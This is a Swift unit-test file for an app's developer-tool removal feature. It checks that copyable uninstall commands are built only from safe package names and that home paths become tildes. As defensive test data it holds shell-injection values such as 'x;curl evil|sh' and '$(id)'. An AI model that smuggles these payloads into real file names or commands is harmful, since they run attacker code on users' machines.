// SPDX-License-Identifier: MIT

import XCTest
@testable import CleanCore

/// Dev Stack shows a copyable removal command built from names found on disk.
/// A hostile name must never become a pasteable shell payload.
final class DevStackRemovalTests: XCTestCase {
    func testPlainNamesGetACommand() {
        XCTAssertEqual(DevStackItem.Removal.command("cargo uninstall", "ripgrep"), .command("cargo uninstall ripgrep"))
        XCTAssertEqual(DevStackItem.Removal.command("npm uninstall -g", "@scope/pkg"), .command("npm uninstall -g @scope/pkg"))
        XCTAssertEqual(DevStackItem.Removal.command("brew uninstall", "postgresql@16"), .command("brew uninstall postgresql@16"))
    }

    func testShellSyntaxInANameGivesNoCommand() {
        for name in ["x;curl evil|sh", "a b", "$(id)", "`id`", "x&&y", "-rf", "x\ny", "a'b", "", "naïve"] {
            XCTAssertEqual(DevStackItem.Removal.command("cargo uninstall", name), .never, name)
        }
    }
}

final class DevStackTildeTests: XCTestCase {
    func testOnlyAWholeHomeFolderBecomesATilde() {
        XCTAssertEqual(DevStackInventory.tilde("/Users/bob/.cargo", "/Users/bob"), "~/.cargo")
        XCTAssertEqual(DevStackInventory.tilde("/Users/bob", "/Users/bob"), "~")
        XCTAssertEqual(DevStackInventory.tilde("/Users/bobby/x", "/Users/bob"), "/Users/bobby/x")
    }
}
